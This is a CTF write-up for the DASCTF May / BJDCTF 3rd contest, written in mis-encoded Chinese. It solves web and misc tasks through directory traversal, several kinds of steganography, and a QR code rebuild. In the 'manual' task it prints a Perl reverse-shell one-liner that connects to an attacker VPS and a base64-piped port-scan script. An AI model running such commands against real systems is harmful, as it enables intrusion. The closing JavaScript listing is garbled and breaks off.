# DASCTFäº”æœˆæœˆèµ› æš¨ BJDCTF 3rd éƒ¨åˆ†WP
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
è¿™é‡Œæ˜¯ä¸»è¦æ˜¯cryptoå’Œmiscéƒ¨åˆ†çš„wpã€‚
## WEB
###  gob
ç™»å½•ä¸‡èƒ½å¯†ç ç™»ï¼ˆå¥½åƒå¯ä»¥ç›´æ¥éšä¾¿è¾“ï¼Ÿï¼‰ç„¶åæ˜¯ä¸€ä¸ªä¸Šä¼ ç•Œé¢
ä¸Šä¼ åæ˜“å¾—ä¸€ä¸ªäºŒçº§ç›®å½•uploadsï¼Œç„¶åçœ‹äº†çœ‹ç›®å½•é‡Œéƒ½æ˜¯å„ç§é©¬ï¼Œä½†æ˜¯å› ä¸ºä¸è§£ææ‰€ä»¥ä¸€ä¸ªéƒ½æ²¡ç”¨ã€‚ã€‚ã€‚
ä½†æ˜¯æ­¤æ—¶å‘ç°æ–‡ä»¶ä¸Šä¼ åæ–‡ä»¶åå¹¶æ²¡æœ‰è¢«æ›´æ”¹ï¼Œæ‰€ä»¥æ¨æµ‹show.phpæ–‡ä»¶åŒ…å«ä¹Ÿæ˜¯ç›´æ¥åŒ…å«çš„æˆ‘ä»¬ä¸Šä¼ çš„æ–‡ä»¶åï¼Œæ‰€ä»¥æ„é€ ä¸€ä¸ª`../../../../flag`æ–‡ä»¶è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œå†è®¿é—®å°±å¯ä»¥å¾—åˆ°flagçš„base64ï¼Œè§£å¯†å³ä¸ºflagï¼ˆPS:å¿…é¡»å¾—åœ¨åŒä¸€ä¸ªsessionä¸­ï¼‰
## MISC
###  Questionnaire
F12è·å¾—flagï¼Œæ ‡å‡†ç­¾åˆ°é¢˜
    null,null,null,null,[["1vV5T8FOS13NOQDji-xYIynLwsUMXcV8aatxUWP6ljvfz-w",null,[740,416,0]
    ]
    ]
    ]
    ,[603160739,"What is the name of the store?",null,0,[[539054317,null,0,null,[[4,302,["Haolinju|haolinju"]
    ,"8cd9"]
    ]
    ]
    ]
    ,null,null,null,null,[["1x4dT2M6J3EbaiVZ37ssMVunsnsB2UMCM6g4LCHyhlHJu-Q",null,[740,416,0]
    ]
    ]
    ]
    ,[488094967," What BRAND is this food?",null,0,[[1465781074,null,0,null,[[4,302,["Daoxiangcun|daoxiangcun"]
    ,"8f00b2"]
    ]
    ]
    ]
    ,null,null,null,null,[["1lH3bwgs28QoVKcUYhtzoqAcacmh4n4CHyWjGQen4RiE3Jw",null,[375,458,1]
    ]
    ]
    ]
    ,[1097246628,"Which RESTAURANT are the ducks coming from? ",null,0,[[353762320,null,0,null,[[4,302,["Jingweizhai|jingweizhai"]
    ,"04e9"]
    ]
    ]
    ]
    ,null,null,null,null,[["11ym4QgB0WEymoJXlmFy7FTC5Eyd5rV1adBbw6vWN5PmXvw",null,[740,555,0]
    ]
    ]
    ]
    ,[1916058196,"Which PARK is this?",null,0,[[901636349,null,0,null,[[4,302,["Jingshan|jingshan"]
    ,"8009"]
    ]
    ]
    ]
    ,null,null,null,null,[["16pfH3k5-5kDo-Rb9BxeKRvx0S-Qy4IgUdlX8iJ0AUOBIwQ",null,[740,554,0]
    ]
    ]
    ]
    ,[1044111735,"Which DISTRICT is the No.3 of Beijing?","The restaurant in question4 is in this Distric",0,[[1620980704,null,0,null,[[4,302,["Chaoyang|chaoyang"]
    ,"98ecf8"]
    ]
    ]
    ]
    ,null,null,null,null,[["1VbfGqSSHlM9D_HY1TsENa6rle3axBYbtKdyHS_klYDLG5g",null,[740,371,0]
    ]
    ]
    ]
    ,[1877231084,"Which part of the Great Wall is this?","In Huairou Distric",0,[[1337434564,null,0,null,[[4,302,["Hefangkou|hefangkou"]
    ,"427e"]
flagä¸ºç­”æ¡ˆåé¢æ‹¼èµ·æ¥çš„å­—ç¬¦ï¼šd41d8cd98f00b204e9800998ecf8427e
* * *
###  babyweb
æ‰“å¼€ç½‘å€ï¼Œä¸€å¼ å›¾ï¼Œä¸‹è½½zipï¼Œå¯†ç è¯´æ˜¯é‚£ä¸ªpassword_is_here
ç„¶åF12å‘ç°
äºæ˜¯æƒ³åˆ°å¯èƒ½æ˜¯å®½å­—èŠ‚éšå†™ï¼Œç„¶åæ‰¾åˆ°åœ¨çº¿å·¥å…·[ç½‘ç«™](https://offdev.net/demos/zwsp-steg-js)è§£å¯†ï¼Œå¾—åˆ°`zerowidthcharactersinvisible`ï¼Œè§£å‹åå¾—åˆ°ä¸€å¼ å€’å™çš„å›¾ï¼Œè„šæœ¬ä¸€æŠŠæ¢­
    a = open('f14g.png','rb').read()
    f = a[::-1]
    b = open('flag.png','wb').write(f)
å¾—åˆ°ä¸€å †å¥‡æ€ªå­—ç¬¦
å‰ä¸‰ä¸ªæ˜¯MINIMOYS, 4-6æ˜¯é“¶æ²³å¯†ç ï¼Œ7-9æ˜¯è·³èˆçš„å°äººï¼Œæœ€åä¸¤ä¸ªæ˜¯é¸Ÿå›¾è…¾
å¾—åˆ°
UVWHZAITWAU
æ‰€ä»¥flagï¼šMD5(â€˜BJD{UVWHZAITWAU}â€™)
* * *
###  /bin/cat 2
è¿›å»åæ˜¯ä¸€å¼ å¤§çš„å›¾ç‰‡ï¼Œé‡Œé¢æœ‰å¾ˆå¤š å°çš„å›¾ç‰‡ï¼Œå°çš„å›¾ç‰‡æœ‰ä¸¤ç§ã€‚
ç„¶åå¦‚æœå°†é¡µé¢ç¼©å°ï¼Œå¯ä»¥éšçº¦çœ‹åˆ°ä¸€ä¸ªäºŒç»´ç 
æ‰€ä»¥æ–¹æ³•ä¸€ï¼šå†™è„šæœ¬è„šæœ¬ï¼Œç„¶åç”ŸæˆäºŒç»´ç ï¼Œå†å°†å›¾ç‰‡æ›¿æ¢â€”â€”é•¿åº¦å‡ä¸€åŠï¼Œæ‰«äºŒç»´ç åmd5å³å¯
exp
    from PIL import Image
    from pyzbar.pyzbar import decode
    import hashlib
    p1 = Image.open('11.png').convert('RGB')    #ç¬¬ä¸€ç§ç±»å‹çš„å›¾ç‰‡
    p2 = Image.open('12.png').convert('RGB')    #ç¬¬äºŒç§ç±»å‹çš„å›¾ç‰‡
    a,b = p1.size
    dif = []
    for y in range(b):
        for x in range(a):
            if p1.getpixel((x,y))!=p2.getpixel((x,y)):
                dif.append((x,y))
    mark = dif[0]
    p = Image.open('res.png').convert('RGB')    #æœ€å¤§çš„ä¸€å¼ å›¾ç‰‡
    aa,bb = p.size
    data = []
    for y in range(0,bb,50):
        for x in range(0,aa,100):
            if p.getpixel((x+mark[0],y+mark[1])) == p1.getpixel(mark):
                data.append('1')
            else:
                data.append('0')
    B = Image.new('L',(10,10),255)
    W = Image.new('L',(10,10),0)
    np = Image.new('L',(290,290),0)
    for y in range(29):
        for x in range(29):
            if data[x+29*y] == '0':
                np.paste(B,(10*x,10*y))
            else:
                np.paste(W,(10*x,10*y))
    np.save('r.png')
    pp = Image.open('r.png')
    barcodes = decode(pp)
    for barcode in barcodes:
        barcodeData = barcode.data.decode("utf-8")
        print(hashlib.md5(barcodeData.encode()).hexdigest())
æ–¹æ³•äºŒï¼šç›´æ¥æˆªå›¾ï¼Œç„¶åæ”¾è¿›Stegsolveï¼Œæ”¹ä¸€ä¸‹è‰²é“å¯ä»¥å¾—åˆ°
ç„¶åæ”¹ä¸€ä¸‹å®½é«˜ï¼Œå°±èƒ½æ‰«å‡ºæ¥äº†ï¼ˆæ”¯ä»˜å®æ‰«ç èƒ½åŠ›æ¯”è¾ƒå¼ºï¼‰ã€‚
* * *
###  manual
é¦–å…ˆsshé“¾æ¥ï¼Œå¾—åˆ°
    % ssh PI:EMAIL -p 10128
    Welcome to BJD3rd Games ~
    ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—
    The above login passwd is encrypted.
    leads:
     - http://emoji.taqini.space
     - suika
    Try to figure out where is your
             #           #####   #####  
    ######  ##     ##   #     # #     #
    #      # #    #  #  #     #       #
    #####    #   #    #  ######    ###  
    #        #   ######       #    #    
    #        #   #    # #     #         
    #      ##### #    #  #####     #    
    p.s. Maybe you have lots of xiaowenhao after login,
         I will help u look up the manual pages of flag.
    Now, input passwd to start the game:
ä¸Šé¢é‚£ä¸ªç½‘å€å°±æ˜¯è™ç¬¦miscä¸­çš„emojiæ›¿ä»£åŠ å¯†ï¼Œå¯†é’¥æ˜¯`suika`ï¼Œä»–æ˜¯ä¸€ç§æ›¿ä»£åŠ å¯†ï¼Œå»ç½‘å€å¾—åˆ°å­—å…¸åè„šæœ¬æ›¿ä»£å¾—åˆ°sshå¯†ç ï¼š`C0dEmOj!so4UnNy`
    a = 'ğŸŒ·ğŸ‘±ğŸŒ ğŸŒ´ğŸ‘·ğŸ†ğŸ€ğŸ‘¼ğŸ‰ğŸ‡ğŸ‘°ğŸğŸ‹ğŸ’ğŸ‘ğŸğŸš¶ğŸğŸ“ğŸ’‘ğŸ€ğŸ„ğŸ’ªğŸ³ğŸ—ğŸ‘†ğŸ˜¶ğŸš˜ğŸ€ğŸ˜®ğŸšœğŸ»ğŸ˜´âš“ğŸ”ğŸ˜ğŸš¢ğŸ¥ğŸ˜•ğŸšŸğŸŠğŸ˜ğŸš¥ğŸ‰ğŸ˜­ğŸš½ğŸŸğŸ˜©âŒ›ğŸšğŸ˜³â˜€ğŸ˜œğŸ˜€ğŸš†ğŸˆğŸ˜„ğŸšŠğŸ´ğŸ˜ŠğŸšŒğŸ¾ğŸ‚ğŸªğŸšğŸ—ğŸ˜šğŸŒ¹ğŸš“ğŸğŸ˜‘ğŸš—ğŸ‘©ğŸ˜¥'
    b = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&*()_+'
    ss = 'ğŸ€ğŸ¾ğŸŒ´ğŸšœğŸ‹ğŸŠğŸ‡ğŸ‚ğŸ“ğŸ‘ğŸˆğŸŸğŸ’ğŸšŸğŸ—'
    print(ss.translate(str.maketrans(a,b)))
ç™»å½•ä¸Šå»åæ˜¯ä¸€ä¸ªç•™è¨€æ¿åŠ ä¸Šä¸€ä¸ªè‡ªå¸¦çš„man
flagæŒ‡ä»¤ï¼Œä½†æ˜¯ä½ ä¸èƒ½é€€å‡ºmanï¼Œé€€å‡ºmançš„è¯å°±ç›´æ¥é€€å‡ºäº†sshï¼Œä½†æ˜¯è¿™ä¸ªmanåˆä¸æ˜¯ä¸€èˆ¬çš„manï¼Œä»–æ˜¯w3mmanï¼Œç„¶åä¸Šé¢çš„`External
Program Settings`ä¸­çš„`External
browser`å¯ä»¥å‘½ä»¤æ‰§è¡Œï¼ˆè¿™ç›¸å½“äºæ˜¯é»˜è®¤å¯åŠ¨é¡¹ï¼Œå¯ä»¥æ’å…¥æŒ‡ä»¤è®©å®ƒæ‰§è¡Œï¼‰ï¼Œä½¿ç”¨perlæ¥åå¼¹shellï¼Œäºæ˜¯æ„å»ºï¼ˆç½‘ä¸Šç™¾åº¦ï¼‰å¾—`perl -e 'use
Socket;$i="ip
addr";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh
-i");};'`ï¼Œå°†shellåå¼¹åˆ°VPSä¸Šï¼Œç„¶åå¼€å§‹ç–¯ç‹‚æŸ¥çœ‹æ–‡ä»¶ä»¥åŠæƒé™ï¼Œå¾—åˆ°`f1a9.py`ä¸º700æƒé™ï¼Œhintåˆè¯´ä¸ç”¨ææƒï¼Œç„¶åçœ‹è§run.shé‡Œ
    #!/bin/sh
    echo "ctf:C0dEmOj!so4UnNy" | chpasswd
    chown -R root:ctf /home/ctf/
    chmod 700 /home/ctf/f1a9.py
    chmod 750 /home/ctf/msh
    /home/ctf/f1a9.py &
    /usr/sbin/sshd -D
å¯ä»¥çœ‹åˆ°f1a9.pyåœ¨å¯åŠ¨æ˜¯å°±åœ¨åå°è¿è¡Œäº†ï¼Œä½†æ˜¯ã€‚ã€‚ã€‚æˆ‘psæ€ä¹ˆå¼„ï¼Œè¿›å…¥`/proc`è¯»å†…å­˜éƒ½æ²¡æ‰¾åˆ°æœ‰ç”¨ä¿¡æ¯ï¼Œä½†æ˜¯å®˜æ–¹çªç„¶ç»™hintï¼š`f1a9.pyçš„ç‹¬ç™½ï¼šæˆ‘çš„çœŸå®èº«ä»½æ˜¯web
server`,äºæ˜¯æ¶å‘èƒ†è¾¹ç”Ÿï¼Œä¿ºçˆ†ç ´ä½ ç«¯å£ï¼Œä½†æ˜¯åˆå› ä¸ºæœåŠ¡å™¨é‡Œæ²¡æœ‰nmapç­‰å¯ä»¥ä¸‰å¥è¯ä»£ç ï¼Œä½¿ç”¨pythonå†™è¿›å»ä¸€å¥è¯çš„æ‰«æç«¯å£è„šæœ¬
åŸç ï¼š
    import requests
    host = ' http://127.0.0.1'
    for i in range(2000,2500):
        add = host+':'+str(i)
        try:
            s = requests.get(add)
            print(i)
            print(s.text)
            exit(1)
        except:
            print(i)
            pass
ä¸€å¥è¯è„šæœ¬ï¼š
    echo aW1wb3J0IHJlcXVlc3RzCmhvc3QgPSAnIGh0dHA6Ly8xMjcuMC4wLjEnCmZvciBpIGluIHJhbmdlKDIwMDAsMjUwMCk6CiAgICBhZGQgPSBob3N0Kyc6JytzdHIoaSkKICAgIHRyeToKICAgICAgICBzID0gcmVxdWVzdHMuZ2V0KGFkZCkKICAgICAgICBwcmludChpKQogICAgICAgIHByaW50KHMudGV4dCkKICAgICAgICBleGl0KDEpCiAgICBleGNlcHQ6CiAgICAgICAgcHJpbnQoaSkKICAgICAgICBwYXNzCg== | base64 -d | python3
å¾—åˆ°äº†2333ç«¯å£æœ‰ç½‘é¡µï¼Œå…¶å†…å®¹ä¸ºä¸€å †base64ç¼–ç ï¼š
çœ‹åˆ°è¿™ä¹ˆå¤šbase64ï¼Œæœ‰å¯èƒ½å°±æ˜¯base64éšå†™ï¼Œè„šæœ¬ä¸€æŠŠæ¢­ï¼š
    import base64
    def get_base64_diff_value(s1,s2):
        table = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
        res = 0
        for i in range(len(s1)):
            if s1[i] != s2[i]:
                return abs(table.index(s1[i]) - table.index(s2[i]))
        return res
    def solve():
        lines = open('stego.txt','r').readlines()
        bin_str = ''
        for line in lines:
            steg_line = line.replace('n','')
            # print(steg_line)
            norm_line = base64.b64encode(base64.b64decode(steg_line)).decode()
            # print(norm_line)
            diff = get_base64_diff_value(steg_line,norm_line)
            # print(diff)
            pad_num = steg_line.count('=')
            if diff:
                bin_str += bin(diff)[2:].zfill(pad_num*2)
            else:
                bin_str += '0' * pad_num * 2
        print(bin_str)
        res_str = ''
        for j in range(int(len(bin_str)/8)):
            # print(8*j,(j+1)*8)
            res_str+=chr(int(bin_str[8*j:(j+1)*8],2))
        print(res_str[-52:])
        print(base64.b64decode(res_str[-52:]))
    solve()
å¾—åˆ°hTtP://999.TaQini.SpAcEï¼Œä¸Šå»åæ˜¯
è¿™ç©æ„ï¼Œf12åå‘ç°æœ‰ä¸€å †å¥‡æ€ªçš„è¡¨æƒ…jsï¼š
ç½‘ä¸Šåœ¨çº¿è§£å¯†aaencodeå¾—åˆ°
       /**
       * åŠå¾„ï¼Œç”»å¸ƒå®½åº¦ï¼Œç”»å¸ƒé«˜åº¦ï¼Œç”»å¸ƒxå†…è¾¹è·ï¼Œç”»å¸ƒyå†…è¾¹è·
       */
       var R = 26, canvasWidth = 400, canvasHeight = 320, OffsetX = 30, OffsetY = 30;
       var circleArr = [];
        function createCirclePoint(diffX, diffY) {
          for (var row = 0; row  0) {
            ctx.beginPath();
            for (var i = 0; i < pwdArr.length; i++) {
              var pointIndex = pwdArr[i];
              ctx.lineTo(circleArr[pointIndex].X, circleArr[pointIndex].Y);
            }
            ctx.lineWidth = 10;
            ctx.strokeStyle = "#713fdf";
            ctx.stroke();
            ctx.closePath();
            if(touchPoint!=null){
              var lastPointIndex=pwdArr[pwdArr.length-1];
              var lastPoint=circleArr[lastPointIndex];
              ctx.beginPath();
              ctx.moveTo(lastPoint.X,lastPoint.Y);
              ctx.lineTo(touchPoint.X,touchPoint.Y);
              ctx.stroke();
              ctx.closePath();
            }
          }
          for (var i = 0; i < circleArr.length; i++) {
            var Point = circleArr[i];
            ctx.fillStyle = "#713fdf";